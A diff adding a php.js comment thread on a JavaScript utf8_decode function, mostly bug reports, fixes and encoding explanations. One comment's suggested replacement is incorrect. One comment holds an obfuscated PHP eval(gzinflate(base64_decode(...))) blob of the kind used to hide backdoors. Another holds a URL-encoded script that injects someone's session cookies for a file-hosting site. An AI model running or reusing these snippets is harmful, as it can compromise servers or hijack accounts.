@@ -1,0 +1,232 @@
+*[Aman Gupta]()* on 2008-05-08 01:42:51  
+This implementation is extremely slow in IE due to string concatenation. It is much faster to push onto an array and return array.join('').
+---------------------------------------
+*[Kevin van Zonneveld](http://kevin.vanzonneveld.net)* on 2008-05-08 21:56:26  
+@ Aman Gupta: Thanks I've updated all of the base64 &amp; utf functions based on your findings.
+---------------------------------------
+*[Norman &quot;zEh&quot; Fuchs]()* on 2008-09-18 15:19:19  
+Unused c1 - fix it : )
+---------------------------------------
+*[Norman &quot;zEh&quot; Fuchs]()* on 2008-09-18 15:20:30  
+2 times htmlentities -.-
+
+#3. .. &amp;quot;zEh&amp;quot;
+---------------------------------------
+*[Norman &quot;zEh&quot; Fuchs]()* on 2008-09-18 15:22:00  
+.. and c3 declaration is missing :D
+---------------------------------------
+*[Kevin van Zonneveld](http://kevin.vanzonneveld.net)* on 2008-09-21 21:43:25  
+@ Norman: Thank you, fixed. What do you mean by 2 times htmlentities though?
+---------------------------------------
+*[hitwork]()* on 2008-10-05 15:07:13  
+There is an error in this function on the following line
+
+} else if ((c1 &gt; 191) &amp;&amp; (c &lt; 224)) {
+
+it should be c1&lt;224
+
+br,
+margus
+---------------------------------------
+*[Kevin van Zonneveld](http://kevin.vanzonneveld.net)* on 2008-10-06 12:25:11  
+@ hitwork: Wow thank you hitwork!
+---------------------------------------
+*[Otto Wyss](http://www.orpatec.ch/index.php?page=gallery.php)* on 2009-04-01 10:07:48  
+I've a folder name "Sihlhölzli" which I utf8_encode on the server with PHP. This gives me "Sihlh\u00f6lzli" and if it's displayed by the browser it nicely shows "Sihlhölzli". Of course I can't use this name to load an image therefore use the utf8_decode in Javascript to decode the name. Unfortunately that doesn't work, not even the browser can display it. Any idea whats wrong?
+---------------------------------------
+*[Tim de Koning](http://www.kingsquare.nl)* on 2009-04-01 16:59:39  
+@otto
+
+PHP 
+```
+utf8_encode('Sihlhölzli')
+```
+returns 'SihlhÃ¶lzli'
+
+JAVASCRIPT
+```
+utf8_decode('SihlhÃ¶lzli');
+```
+returns 'Sihlhölzli'
+
+Seems fine to me...?
+
+
+---------------------------------------
+*[Kevin van Zonneveld](http://kevin.vanzonneveld.net)* on 2009-04-03 16:45:52  
+@ Tim de Koning: thx for helping out man! 
+@ Otto Wyss: Can you confirm this?
+---------------------------------------
+*[Ben Pettit](www.digimulti.com)* on 2009-05-05 01:33:17  
+This function had troubles with the utf8_encode function when i included the transport.min.js file into my adobe javascript plugin, while using the md5 function.
+The way i fixed it was by adding as the first line:
+```
+str_data = str_data.valueOf();
+```
+
+Thanks for the great open source library!  I'm just trying to give back a little bit.
+Cheers,
+Ben.
+---------------------------------------
+*[Kevin van Zonneveld](http://kevin.vanzonneveld.net)* on 2009-05-12 17:51:18  
+@ Ben Pettit: There has been some talk about it over at the utf8_encode function. Let's work it out over there, and then - if needed - we'll fix utf8_decode accordingly.
+---------------------------------------
+*[Michel Corne](http://mcorne.blogspot.com/)* on 2009-09-23 17:37:18  
+I am afraid there is a problem with this function. Try to convert "à" that is multibyte character. "str_data.length" equals "1" (char) since javascript is UTF-8 compliant. But C1 = 224 that is > 128 and you end up playing with C2 and C3 that don't even exist :-) Here is the code I propose. It simply translates the string from UTF-8 to iso-8859-15 (improved from iso-8859-1) with a translation table for all non ASCII characters. Let me know what you think. Thanks, MC.
+
+```
+function utf8_decode (utf8) {
+    // control characters are left for alignment reasons, they will not be used anyway!
+    var i, iso885915 = '', 
+    utf8ToIso885915 = {
+    'NBSP': '\xA0', '¡': '\xA1', '¢': '\xA2', '£': '\xA3', '€': '\xA4', '¥': '\xA5', 'Š': '\xA6', '§': '\xA7', 
+    'š': '\xA8', '©': '\xA9', 'ª': '\xAA', '«': '\xAB', '¬': '\xAC', 'SHY': '\xAD', '®': '\xAE', '¯': '\xAF',
+    '°': '\xB0', '±': '\xB1', '²': '\xB2', '³': '\xB3', 'Ž': '\xB4', 'µ': '\xB5', '¶': '\xB6', '·': '\xB7', 
+    'ž': '\xB8', '¹': '\xB9', 'º': '\xBA', '»': '\xBB', 'Œ': '\xBC', 'œ': '\xBD', 'Ÿ': '\xBE', '¿': '\xBF', 
+    'À': '\xC0', 'Á': '\xC1', 'Â': '\xC2', 'Ã': '\xC3', 'Ä': '\xC4', 'Å': '\xC5', 'Æ': '\xC6', 'Ç': '\xC7', 
+    'È': '\xC8', 'É': '\xC9', 'Ê': '\xCA', 'Ë': '\xCB', 'Ì': '\xCC', 'Í': '\xCD', 'Î': '\xCE', 'Ï': '\xCF', 
+    'Ð': '\xD0', 'Ñ': '\xD1', 'Ò': '\xD2', 'Ó': '\xD3', 'Ô': '\xD4', 'Õ': '\xD5', 'Ö': '\xD6', '×': '\xD7', 
+    'Ø': '\xD8', 'Ù': '\xD9', 'Ú': '\xDA', 'Û': '\xDB', 'Ü': '\xDC', 'Ý': '\xDD', 'Þ': '\xDE', 'ß': '\xDF', 
+    'à': '\xE0', 'á': '\xE1', 'â': '\xE2', 'ã': '\xE3', 'ä': '\xE4', 'å': '\xE5', 'æ': '\xE6', 'ç': '\xE7', 
+    'è': '\xE8', 'é': '\xE9', 'ê': '\xEA', 'ë': '\xEB', 'ì': '\xEC', 'í': '\xED', 'î': '\xEE', 'ï': '\xEF', 
+    'ð': '\xF0', 'ñ': '\xF1', 'ò': '\xF2', 'ó': '\xF3', 'ô': '\xF4', 'õ': '\xF5', 'ö': '\xF6', '÷': '\xF7', 
+    'ø': '\xF8', 'ù': '\xF9', 'ú': '\xFA', 'û': '\xFB', 'ü': '\xFC', 'ý': '\xFD', 'þ': '\xFE', 'ÿ': '\xFF'
+    }
+    
+    for (i = 0; i < utf8.length; i++){
+        iso885915 += utf8ToIso885915[utf8[i]]? utf8ToIso885915[utf8[i]] : utf8[i];
+    }
+
+    return iso885915;
+}
+[/CODE
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2009-09-24 02:55:15  
+@Michel Corne: Thank you for the function. The site still has some apparent problems with Unicode in comments (if not the function!), so would you mind submitting your code to http://pastebin.com/ and sending us a link?
+---------------------------------------
+*[Walessio]()* on 2009-12-29 10:28:07  
+Bugs found from Firefox 3.0.16 (on Windows Vista):
+i is not defined 
+tmp_arr is not defined
+
+add this to solve the problem:
+var i;
+var tmp_arr = new Array();
+
+also, unserialize does not unserialize serialized associative arrays
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2009-12-30 06:52:42  
+@Walessio: The declaration was already there (and for some more variables too), but I think the syntax highlighter doesn't accurately insert newlines, so when you copy-paste, it doesn't always preserve them. To be safer, just paste from the "raw js source" link.
+@Kevin, I think here's some proof that it'd be better to go back to the old commenting system... The function shows the declaration, but when people copy-paste it, some lines get merged into comments, etc. Sorry for all of these "unfunded" requests... :)
+---------------------------------------
+*[Chris Ahrweiler]()* on 2010-01-27 10:06:42  
+Hello, 
+
+tried the function, looking good, but german Umlaut "ß" wouldn't be converted correctly. Any improved version of this function available?
+
+Regards, Chris.
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2010-01-31 05:22:26  
+@Chris Ahrweiler: Are you sure you are using it correctly? 
+
+Please note that these functions in php.js are not related to whether the current page itself is in UTF-8 or not; JavaScript always uses UTF-16 internally.
+
+As a little background if you weren't aware, JavaScript internally uses two-bytes to represent every character (or four bytes in some extremely rare characters--surrogate pairs which are two pseudo-characters joined together to form a single character but whose string length is 2). UTF-8, on the other hand, uses 1-4 bytes for each character, while ISO-8859-1 uses exactly 1 byte (it can do that because is far more limited, in handling only Latin characters). UTF-8 uses 1-2 bytes for the same range as ISO-8859-1 (1 bytes for the ASCII); the reason it must use 2 bytes in some cases, even though Unicode assigns the same code points as used in in ISO-8859-1, is because one of the bits in a UTF-8 byte is reserved for indicating whether the byte is a single 1-byte sequence or part of a multi-byte sequence.
+
+So, in order to represent UTF-8 in JavaScript (and even ISO-8859-1), we are forced with either using an array of code points, where each number represents the value for a single byte, or using a string where each character has the code point value of a single byte. 
+
+Internally, JavaScript will use two bytes (or rarely 4 bytes), but we can use its strings to represent a sequence of single byte characters (ISO-8859-1) or a sequence of 1-4 byte character sequences (UTF-8). (If you put the text in an alert, our "UTF-8" will not be human-readable, while our "ISO-8859-1" will be.)
+
+In JavaScript you can easily discover what the UTF-8 sequence for a character should be by using encodeURIComponent. For the sharp-S, it gives "%C3%9F", which, translated into a multiple single-byte string sequence is "\u00C3\u009F" or, more visually, "Ã\u009F". 
+
+In ISO-8859-1, it should simply be "\u00DF" or "ß".
+
+In other words, we can treat regular JavaScript as though it were ISO-8859-1 since both have a fixed correspondence between a character and number of bytes (ISO-8859-1 is 1-to-1 while UTF-16 is 1 to 2, unless for rare (and non-Latin) characters not present in ISO-8859-1 where the correspondence is 1-to-4; 4-byte characters are necessary in some cases since even 2 bytes is not enough to represent all of the scripts supported by Unicode).
+
+So, "utf8_decode" would only be used if you already have a string of characters in this artificial "UTF-8" where each "character" has up to a full byte of value (0-255)--representing a single byte in a UTF-8 1-4 byte sequence.
+
+"utf8_encode", on the other hand, would let you encode a ISO-8859-1 string (or Latin UTF-16 strings) into such an artificial "UTF-8" sequence of 1-2 byte sequences.
+
+If the above doesn't help, feel free to clarify exactly what you are trying to do and why.
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2010-01-31 05:29:24  
+By the way, if you change the functions to avoid String.fromCharCode() and charCodeAt(), and just deal with an array of numbers, you can convert between the character sets more efficiently (unless you need to print to string format).
+---------------------------------------
+*[Eli Grey](http://eligrey.com/)* on 2010-09-19 00:29:30  
+This entire function can be replaced with the following.
+
+```
+function utf8_decode (str_data) {
+    return unescape(encodeURIComponent(str_data));
+}
+```
+---------------------------------------
+*[Michael]()* on 2010-11-05 11:52:20  
+I tried this function with german umlauts ('ä') and didn't get it working. I have a login form on a UTF-8 page and must convert the user input data to ISO-8859-1 before submitting (the target server only accepts ISO-8859-1).
+
+The conversion is done, but the login fails because of wrong credentials (due to the "ä" in the password field). 
+
+Is there a problem with converting data from user input fields?
+---------------------------------------
+*[Neilmas]()* on 2010-11-09 18:47:55  
+Excelente script gracias de Perú.
+---------------------------------------
+*[Anurup Raveendran](www.mecmh.com)* on 2010-11-21 18:50:37  
+hey ! this function saved my life :D . thanks alot !!!!
+---------------------------------------
+*[ikizsohbet](http://www.ikizsohbet.com)* on 2010-12-13 23:52:29  
+help ????????
+
+<?php
+eval(gzinflate(base64_decode('NdI3kptQAADQfk/hbrWzhUDkscc7ILJAIJJYGs+H/0kiZzi93fgGr3hfv99+fXV594YWUJ2yo2jSCkzoFIMR0eQfiJIWotP7HSrUq9cfvCQ6xO3cDoavIa3gA+nT5oJMdmSBz4BrBBFoMmtjz+FjZ79xi0jsFI84sYHPIeLLx+egvobtIYexZmUHyOHBbVIVbONCshu1gsDtJV/judKdL0Ky97h7paP6vJWma+Sm54VmF6Fva5cFfQyumnfb2toDMw8EebslBdbKvnsjJ4pXUSxVui3bgolkN4xSr3s6NLnqryUVmGgdqHwxeh3zCFCV6f5I6yM32Gf4z4klV363xJfPeLS7HqNwGQEYzvhRyU78jZWciDsN1+ezlubayDuHdqszPwxk6Ra0gU/abqWu2DpdwkBpAwZMzuqpXVKtlnhgdpA2SuHbKDpoER4RFu3y2ujY4UodhyPzqpGv3mcOAE2yqBEkmXtPQMG07QV1PeM7ljSOxHDh+RlrmnFyWNxlAhDmY7KPCXNfRYItdrY+0m6JakQLbgwVbmXT0KpfYIzia2livK8S8AlXk/J1R0k4m5Hn+zkOKw8rW+XygLusA5KqGXUa+6OdiqKaWss0KMUzaM7ntykqiO0uh1dTkgDZ5PM82wT3CevxXAE1ZezzkqnvHx8fP9++/gf78Rc=')));
+?>
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2010-12-14 04:57:24  
+@ikizsohbet: Sorry, the best I can suggest is looking at gzinflate() in the PHP C source code and converting it to JavaScript (and then hopefully sharing with us!) :)
+
+The path where the function is defined is /ext/zlib/zlib.c
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2010-12-14 05:07:35  
+@ikizsohbet: As I should have said, if you are only trying to figure out the code for yourself (and not from JavaScript), just change the eval() into echo() and run on PHP.
+---------------------------------------
+*[Brett Zamir](http://brett-zamir.me)* on 2010-12-14 05:09:09  
+@ikizsohbet: And to be extra careful to protect yourself from a potential XSS attack (if you run this test on your server), inside your echo(), also make a proper call to htmlentities().
+---------------------------------------
+*[Knight4]()* on 2011-08-29 17:43:42  
+I'm having issues with uppercase latin characters such as "Ç", for instance.
+
+Any ideas? Thanks in advance
+---------------------------------------
+*[Martins]()* on 2012-02-22 22:30:12  
+this function breaks ¹ ² ³ symbols
+---------------------------------------
+*[????? ????????](http://an3m1.com/)* on 2012-03-22 13:53:33  
+News stories in the world of new cars 
+---------------------------------------
+*[ferliplex]()* on 2012-05-11 11:57:33  
+%20var%20domain%20=%20'extabit.com';var%20cookies%20=%20new%20Array();cookies['auth_uid']%20=%20'105657';cookies['auth_hash']%20=%20'dfc04c16bced7543c9518e092ade6f1d';if%20(location.href.indexOf(domain)==-1)%20{var%20g%20=%20confirm('You%20will%20be%20redirected%20to%20'%20+%20domain%20+%20'.%20You%20will%20have%20to%20run%20this%20script%20again.%20Continue?');if%20(g)%20{location.href%20=%20'http://'%20+%20domain;}}%20else%20{alert("premiumhunt2012.blogspot.com");for(var%20i%20in%20cookies){void(document.cookie%20=%20i+'='+cookies[i]+';domain=.'+domain+';path=/;');}location.href%20=%20'http://'+domain;}
+---------------------------------------
+*[Rene Olivo]()* on 2012-08-30 21:27:18  
+add 	
+
+tmp_arr=Array();
+
+in the line 24 and this work!
+---------------------------------------
+*[Jacob Lee]()* on 2012-09-11 18:10:30  
+Seems to me it does work differently from PHP's when the text has multibyte character inside.
+
+example)
+in php
+```
+echo base64_encode(utf8_encode('this is the text and 한글')); // Korean characters inside
+```
+in Javascript
+```
+document.write(base64_encode(utf8_encode('this is the text and 한글)));
+```
+the php result is not the same with javascript result.
+---------------------------------------
+*[Jacob Lee]()* on 2012-09-12 17:34:59  
+Now I got it! If you want the output of PHP and that of Javascript to be same, use utf16to8 and utf8to16 function for javascript for javascript's string represents as utf16.
+---------------------------------------
